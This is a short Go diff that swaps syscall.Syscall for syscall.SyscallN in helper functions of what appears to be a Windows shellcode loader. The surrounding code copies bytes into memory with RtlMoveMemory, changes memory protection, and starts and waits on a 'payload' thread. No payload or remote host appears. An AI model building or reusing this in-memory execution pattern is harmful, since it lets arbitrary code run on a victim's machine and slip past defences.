@@ -114,9 +114,9 @@ func mapMemory(data []byte) uintptr {
 		return 0
 	}
 	// RtlMoveMemory is a void routine; its errno slot is meaningless.
-	_, _, _ = syscall.Syscall(
-		procRtlMoveMemory.Addr(), 3,
-		addr, uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)),
+	_, _, _ = syscall.SyscallN(
+		procRtlMoveMemory.Addr(), addr, uintptr(unsafe.Pointer(&data[0])),
+		uintptr(len(data)),
 	)
 	var old uint32
 	ok, _, _ := syscall.Syscall6(
@@ -146,7 +146,7 @@ func runSynchronous(data []byte) {
 	}
 	// Block until the payload thread exits; the meaningful outcome is the
 	// wait result in slot one, not the errno slot.
-	_, _, _ = syscall.Syscall(procWaitForSingle.Addr(), 2, thread, infinite, 0)
+	_, _, _ = syscall.SyscallN(procWaitForSingle.Addr(), thread, infinite, 0)
 }
 
 // startThread allocates and spawns the payload on a detached kernel32
